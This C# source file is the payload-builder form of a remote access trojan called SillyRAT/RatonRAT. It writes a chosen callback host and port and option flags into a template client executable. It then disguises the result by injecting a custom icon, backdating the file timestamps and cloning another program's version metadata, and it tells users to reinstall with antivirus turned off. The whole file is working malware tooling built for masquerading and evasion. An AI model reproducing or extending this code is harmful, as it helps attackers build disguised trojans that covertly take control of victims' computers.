using System;
using Newtonsoft.Json;
using System.Windows.Forms;
using System.IO;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using System.Threading.Tasks;
using Stuff;
using System.Drawing;
using System.Drawing.Drawing2D;
using Server.Classes;
using System.Collections.Generic;
using Mono.Cecil;
using System.Diagnostics;
using Vestris.ResourceLib;
using RatonRAT;

namespace SillyRAT
{
    public partial class Form3 : Form
    {
        private Image button6Image;

        private Image button7Image;

        private Image button8Image;

        private string selectedIconPath = string.Empty;
        public Form3()
        {
            InitializeComponent();
            this.TopMost = true;
        }

        private void savePorts()
        {
            try
            {
                var portz = new List<string>();
                foreach (var item in listBox2.Items)
                {
                    portz.Add(item.ToString());
                }
                string filePath = Path.Combine("Data", "builderports.json");

                if (File.Exists(filePath))
                {
                    File.Delete(filePath);
                }

                string json = JsonConvert.SerializeObject(portz, Formatting.Indented);
                File.WriteAllText(filePath, json);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error saving ports: {ex.Message}");
            }
        }

        private void saveHosts()
        {
            try
            {
                var hostz = new List<string>();
                foreach (var item in listBox1.Items)
                {
                    hostz.Add(item.ToString());
                }
                string filePath = Path.Combine("Data", "builderhosts.json");

                if (File.Exists(filePath))
                {
                    File.Delete(filePath);
                }

                string json = JsonConvert.SerializeObject(hostz, Formatting.Indented);
                File.WriteAllText(filePath, json);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error saving hosts: {ex.Message}");
            }
        }

        private void loadHost()
        {
            string filePath = Path.Combine("Data", "builderhosts.json");
            if (File.Exists(filePath))
            {
                string json = File.ReadAllText(filePath);
                var hostzz = JsonConvert.DeserializeObject<List<string>>(json);
                listBox1.Items.Clear();
                foreach (var host in hostzz)
                {
                    listBox1.Items.Add(host);
                }
            }
            else
            {
                listBox1.Items.Add("127.0.0.1");
            }
        }

        private void loadPort()
        {
            string filePath = Path.Combine("Data", "builderports.json");
            if (File.Exists(filePath))
            {
                string json = File.ReadAllText(filePath);
                var portzz = JsonConvert.DeserializeObject<List<string>>(json);
                listBox2.Items.Clear();
                foreach (var port in portzz)
                {
                    listBox2.Items.Add(port);
                }
            }
            else
            {
                listBox2.Items.Add("8888");
            }
        }




        private void button1_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            if (!string.IsNullOrEmpty(textBox1.Text))
            {
                listBox1.Items.Add(textBox1.Text);
                textBox1.Clear();
            }
            else
            {
                MessageBox.Show("Please insert a valid input", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            if (listBox1.SelectedItem != null)
            {
                listBox1.Items.Remove(listBox1.SelectedItem);
            }
            else
            {
                MessageBox.Show("Please select a item from the box", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            if (int.TryParse(textBox2.Text, out int number) && number < 100000)
            {
                listBox2.Items.Add(number.ToString());
                textBox2.Clear();
            }
            else
            {
                MessageBox.Show("Please insert a valid input", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            if (listBox2.SelectedItem != null)
            {
                listBox2.Items.Remove(listBox2.SelectedItem);
            }
            else
            {
                MessageBox.Show("Please select a item from the box", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void Form3_Load(object sender, EventArgs e)
        {
            new RatonRAT.Classes.LightMode().Apply(this);
            check.Start();
            comboBox1.Items.Add("Error");
            comboBox1.Items.Add("Information");
            comboBox1.Items.Add("Warning");
            if (comboBox1.SelectedItem == null)
            {
                comboBox1.SelectedItem = "Error";
            }
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 25));
            button1.Region = new Region(CreateRoundPath(button1.ClientRectangle, 10));
            button2.Region = new Region(CreateRoundPath(button2.ClientRectangle, 10));
            button3.Region = new Region(CreateRoundPath(button3.ClientRectangle, 10));
            button4.Region = new Region(CreateRoundPath(button4.ClientRectangle, 10));
            button5.Region = new Region(CreateRoundPath(button5.ClientRectangle, 10));
            button6.Region = new Region(CreateRoundPath(button6.ClientRectangle, 10));
            button7.Region = new Region(CreateRoundPath(button7.ClientRectangle, 10));
            button8.Region = new Region(CreateRoundPath(button8.ClientRectangle, 10));
            button11.Region = new Region(CreateRoundPath(button11.ClientRectangle, 10));
            loadPort();
            loadHost();
            button6Image = RatonRAT.Properties.Resources.list;
            button6.Invalidate();
            button7Image = RatonRAT.Properties.Resources.start;
            button7.Invalidate();
            button8Image = RatonRAT.Properties.Resources.information;
            button8.Invalidate();
        }

        private static GraphicsPath CreateRoundPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(rect.X, rect.Y, radius, radius, 180, 90);
            path.AddArc(rect.Width - radius - 1, rect.Y, radius, radius, 270, 90);
            path.AddArc(rect.Width - radius - 1, rect.Height - radius - 1, radius, radius, 0, 90);
            path.AddArc(rect.X, rect.Height - radius - 1, radius, radius, 90, 90);
            path.CloseFigure();
            return path;
        }

        private async void button5_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            string stub = @"Builder\Template.exe";
            if (!File.Exists(stub))
            {
                MessageBox.Show("Template not found. Please recompile or reinstall the program with your AV off!", "Building error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (listBox1.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please add and select a host from the box", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (listBox1.SelectedItems.Count > 1)
            {
                MessageBox.Show("Please select only one host", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (listBox2.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please add and select a port from the box", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (listBox2.SelectedItems.Count > 1)
            {
                MessageBox.Show("Please select only one port", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (checkBox6.Checked && textBox3.TextLength < 1)
            {
                MessageBox.Show("Please insert some text on the message box or disable it", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (checkBox13.Checked && textBox5.TextLength < 1)
            {
                MessageBox.Show("Please insert atleast a name on the message box or disable it", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (txttag.TextLength < 1)
            {
                txttag.Text = "Raton";
            }
            if(textBox10.TextLength < 1 && checkBox6.Checked == true)
            {
                MessageBox.Show("Please insert a title for the message box or disable it", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (checkBox10.Checked && (string.IsNullOrEmpty(textBox4.Text) ||
                                        (!textBox4.Text.StartsWith("http://") && !textBox4.Text.StartsWith("https://"))))
            {
                MessageBox.Show("Please insert a valid link or disable it", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (checkBox2.Checked) savePorts();
            if (checkBox3.Checked) saveHosts();
            SaveFileDialog saveTemplate = new SaveFileDialog();
            saveTemplate.Filter = "Executable (*.exe)|*.exe";
            if (saveTemplate.ShowDialog() == DialogResult.OK)
            {
                button5.Enabled = false;
                button11.Enabled = false;
                button5.Text = "Building server...";
                string outputFile = saveTemplate.FileName;
                byte[] stubBytes = File.ReadAllBytes(stub);
                using (MemoryStream memoryStream = new MemoryStream(stubBytes))
                {
                    ModuleDef module = ModuleDefMD.Load(memoryStream);

                    await Task.Run(() =>
                    {
                        foreach (var type in module.Types)
                        {
                            foreach (var method in type.Methods)
                            {
                                if (!method.HasBody) continue;

                                for (int i = 0; i < method.Body.Instructions.Count; i++)
                                {
                                    if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                    {
                                        if (method.Body.Instructions[i].Operand == null) return;

                                        string operandValue = method.Body.Instructions[i].Operand.ToString();

                                        switch (operandValue)
                                        {
                                            case "silly1":
                                                method.Body.Instructions[i].Operand = Helpers.Random();
                                                break;
                                            case "silly2":
                                                this.Invoke((MethodInvoker)(() =>
                                                {
                                                    method.Body.Instructions[i].Operand = listBox1.SelectedItem.ToString();
                                                }));
                                                break;
                                            case "silly3":
                                                this.Invoke((MethodInvoker)(() =>
                                                {
                                                    method.Body.Instructions[i].Operand = listBox2.SelectedItem.ToString();
                                                }));
                                                break;
                                            case "silly4":
                                                this.Invoke((MethodInvoker)(() =>
                                                {
                                                    method.Body.Instructions[i].Operand = checkBox1.Checked.ToString().ToLower();
                                                }));
                                                break;
                                            case "silly5":
                                                this.Invoke((MethodInvoker)(() =>
                                                {
                                                    method.Body.Instructions[i].Operand = numericUpDown1.Value.ToString();
                                                }));
                                                break;
                                            case "silly6":
                                                this.Invoke((MethodInvoker)(() =>
                                                {
                                                    method.Body.Instructions[i].Operand = checkBox4.Checked.ToString().ToLower();
                                                }));
                                                break;
                                            case "silly7":
                                                this.Invoke((MethodInvoker)(() =>
                                                {
                                                    method.Body.Instructions[i].Operand = checkBox5.Checked.ToString().ToLower();
                                                }));
                                                break;
                                            case "silly8":
                                                this.Invoke((MethodInvoker)(() =>
                                                {
                                                    method.Body.Instructions[i].Operand = checkBox6.Checked.ToString().ToLower();
                                                }));
                                                break;
                                            case "silly9":
                                                this.Invoke((MethodInvoker)(() =>
                                                {
                                                    method.Body.Instructions[i].Operand = textBox3.Text.ToString();
                                                }));
                                                break;
                                            case "silly10":
                                                this.Invoke((MethodInvoker)(() =>
                                                {
                                                    method.Body.Instructions[i].Operand = comboBox1.SelectedItem.ToString();
                                                }));
                                                break;
                                            case "silly11":
                                                this.Invoke((MethodInvoker)(() =>
                                                {
                                                    method.Body.Instructions[i].Operand = checkBox8.Checked.ToString().ToLower();
                                                }));
                                                break;
                                            case "silly12":
                                                this.Invoke((MethodInvoker)(() =>
                                                {
                                                    method.Body.Instructions[i].Operand = checkBox9.Checked.ToString().ToLower();
                                                }));
                                                break;
                                            case "silly13":
                                                this.Invoke((MethodInvoker)(() =>
                                                {
                                                    method.Body.Instructions[i].Operand = checkBox10.Checked.ToString().ToLower();
                                                }));
                                                break;
                                            case "silly14":
                                                this.Invoke((MethodInvoker)(() =>
                                                {
                                                    method.Body.Instructions[i].Operand = textBox4.Text.ToString();
                                                }));
                                                break;
                                            case "silly15":
                                                this.Invoke((MethodInvoker)(() =>
                                                {
                                                    method.Body.Instructions[i].Operand = checkBox11.Checked.ToString().ToLower();
                                                }));
                                                break;
                                            case "silly16":
                                                this.Invoke((MethodInvoker)(() =>
                                                {
                                                    method.Body.Instructions[i].Operand = txttag.Text.ToString();
                                                }));
                                                break;
                                            case "silly17":
                                                this.Invoke((MethodInvoker)(() =>
                                                {
                                                    method.Body.Instructions[i].Operand = textBox10.Text.ToString();
                                                }));
                                                break;
                                            case "silly18":
                                                this.Invoke((MethodInvoker)(() =>
                                                {
                                                    method.Body.Instructions[i].Operand = customSwitch1.Checked.ToString().ToLower();
                                                }));
                                                break;
                                            case "silly19":
                                                this.Invoke((MethodInvoker)(() =>
                                                {
                                                    method.Body.Instructions[i].Operand = customSwitch2.Checked.ToString().ToLower();
                                                }));
                                                break;
                                        }
                                    }
                                }
                            }
                        }
                    });
                    module.Write(outputFile);
                    module.Dispose();
                }

                if (!string.IsNullOrEmpty(selectedIconPath) && File.Exists(selectedIconPath)) // icon inject
                {
                    ResourceModifier.ChangeIcon(saveTemplate.FileName, selectedIconPath);
                }

                if (checkBox7.Checked == true) // date
                {
                    DateTime selectedDate = dateTimePicker1.Value;
                    File.SetCreationTime(outputFile, selectedDate);
                    File.SetLastWriteTime(outputFile, selectedDate);
                    File.SetLastAccessTime(outputFile, selectedDate);
                }

                if (checkBox13.Checked == true)
                {
                    assemblyStuff(saveTemplate.FileName);
                }
                MessageBox.Show("Click to finish the build", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                this.Close();
                button5.Enabled = true;
                button11.Enabled = true;
            }
        }

        private void assemblyStuff(string filename)
        {
            try
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(filename);
                versionResource.Language = 0;
                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["InternalName"] = textBox5.Text;
                stringFileInfo["OriginalFilename"] = textBox5.Text;
                stringFileInfo["ProductName"] = textBox6.Text;
                stringFileInfo["CompanyName"] = textBox7.Text;
                stringFileInfo["FileDescription"] = textBox8.Text;
                stringFileInfo["LegalCopyright"] = textBox9.Text;
                stringFileInfo["LegalTrademarks"] = textBox9.Text;

                versionResource.SaveTo(filename);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
        }


        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                button1.PerformClick();
            }
        }

        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                button3.PerformClick();
            }
        }

        private void button7_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            panel8.Visible = false;
            panel9.Visible = true;
            panel12.Visible = false;
        }

        private void panel3_Paint(object sender, PaintEventArgs e)
        {

        }

        private void button10_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Icon Files (*.ico)|*.ico";
                openFileDialog.Title = "Select a client icon";

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    selectedIconPath = openFileDialog.FileName;
                    pictureBox1.BackgroundImage = Image.FromFile(selectedIconPath);
                }
            }
        }

        private void label10_Click(object sender, EventArgs e)
        {

        }

        private async void button11_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            Size targetSize = new Size(3, 2);
            Size startSize = new Size(1003, 469);
            int delay = 500 / 40;

            for (int i = 0; i <= 40; i++)
            {
                float t = (float)i / 40;
                int width = (int)(startSize.Width + (targetSize.Width - startSize.Width) * t);
                int height = (int)(startSize.Height + (targetSize.Height - startSize.Height) * t);

                this.Size = new Size(width, height);
                await Task.Delay(delay);
            }
            this.Close();
            Program.form2.Opacity = 100;
        }

        private void button6_Click(object sender, EventArgs e)
        {
            panel8.Visible = true;
            panel9.Visible = false;
            panel12.Visible = false;
        }

        private void button9_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
        }

        private void button8_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            panel8.Visible = false;
            panel9.Visible = false;
            panel12.Visible = true;
        }






        private void button6_Paint(object sender, PaintEventArgs e)
        {
            e.Graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;

            int newHeight = button6.Height;
            int newWidth = (button6Image.Width * newHeight) / button6Image.Height;

            e.Graphics.DrawImage(button6Image, new Rectangle(0, 0, newWidth, newHeight));
        }
        private void button7_Paint(object sender, PaintEventArgs e)
        {
            e.Graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;

            int newHeight = button7.Height;
            int newWidth = (button7Image.Width * newHeight) / button7Image.Height;

            e.Graphics.DrawImage(button7Image, new Rectangle(0, 0, newWidth, newHeight));
        }
        private void button8_Paint(object sender, PaintEventArgs e)
        {
            e.Graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;

            int newHeight = button8.Height;
            int newWidth = (button8Image.Width * newHeight) / button8Image.Height;

            e.Graphics.DrawImage(button8Image, new Rectangle(0, 0, newWidth, newHeight));
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void checkBox9_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void checkBox10_CheckedChanged(object sender, EventArgs e)
        {
            if(checkBox10.Checked == true)
            {
                textBox4.Enabled = true;
            } else
            {
                textBox4.Enabled = false;
            }
        }

        private void panel11_Paint(object sender, PaintEventArgs e)
        {

        }

        private void button12_Click(object sender, EventArgs e)
        {
            MessageBox.Show("If the assistance mode is enabled, the user can stop the connection.", "Assistance mode", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void button13_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                openFileDialog.Title = "Clone assembly";

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string exePath = openFileDialog.FileName;

                    try
                    {
                        var assembly = AssemblyDefinition.ReadAssembly(exePath);
                        var module = assembly.MainModule;

                        textBox5.Text = "Nothing";
                        textBox6.Text = "Nothing";
                        textBox7.Text = "Nothing";
                        textBox8.Text = "Nothing";
                        textBox9.Text = "Nothing";

                        foreach (var attr in module.Assembly.CustomAttributes)
                        {
                            string attrName = attr.AttributeType.FullName;
                            string value = attr.ConstructorArguments.Count > 0 ? attr.ConstructorArguments[0].Value.ToString() : "Nothing";

                            if (attrName == "System.Reflection.AssemblyTitleAttribute") textBox5.Text = value;
                            if (attrName == "System.Reflection.AssemblyProductAttribute") textBox6.Text = value;
                            if (attrName == "System.Reflection.AssemblyCompanyAttribute") textBox7.Text = value;
                            if (attrName == "System.Reflection.AssemblyDescriptionAttribute") textBox8.Text = value;
                            if (attrName == "System.Reflection.AssemblyTrademarkAttribute") textBox9.Text = value;
                        }

                        MessageBox.Show("Loaded successfully!", ":3", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    catch (BadImageFormatException)
                    {
                        FileVersionInfo fileInfo = FileVersionInfo.GetVersionInfo(exePath);

                        textBox5.Text = fileInfo.FileDescription ?? "Nothing";
                        textBox6.Text = fileInfo.ProductName ?? "Nothing";
                        textBox7.Text = fileInfo.CompanyName ?? "Nothing";
                        textBox8.Text = fileInfo.Comments ?? "Nothing";
                        textBox9.Text = fileInfo.LegalTrademarks ?? "Nothing";

                        MessageBox.Show("Loaded successfully!", ":3", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
        }

        private void panel8_Paint(object sender, PaintEventArgs e)
        {

        }

        private void textBox10_TextChanged(object sender, EventArgs e)
        {

        }

        private void check_Tick(object sender, EventArgs e)
        {
            if (checkBox6.Checked == true)
            {
                comboBox1.Enabled = true;
                textBox10.Enabled = true;
                textBox3.Enabled = true;
            }
            else
            {
                textBox3.Enabled = false;
                textBox10.Enabled = false;
                comboBox1.Enabled = false;
            }
            if (checkBox7.Checked == true)
            {
                dateTimePicker1.Enabled = true;
            }
            else
            {
                dateTimePicker1.Enabled = false;
            }
            if (checkBox13.Checked == true)
            {
                button13.Enabled = true;
                textBox5.Enabled = true;
                textBox6.Enabled = true;
                textBox7.Enabled = true;
                textBox8.Enabled = true;
                textBox9.Enabled = true;
            }
            else
            {
                button13.Enabled = false;
                textBox5.Enabled = false;
                textBox6.Enabled = false;
                textBox7.Enabled = false;
                textBox8.Enabled = false;
                textBox9.Enabled = false;
            }
        }

        private void label11_Click(object sender, EventArgs e)
        {

        }

        private void customSwitch1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void panel9_Paint(object sender, PaintEventArgs e)
        {

        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
    }
}
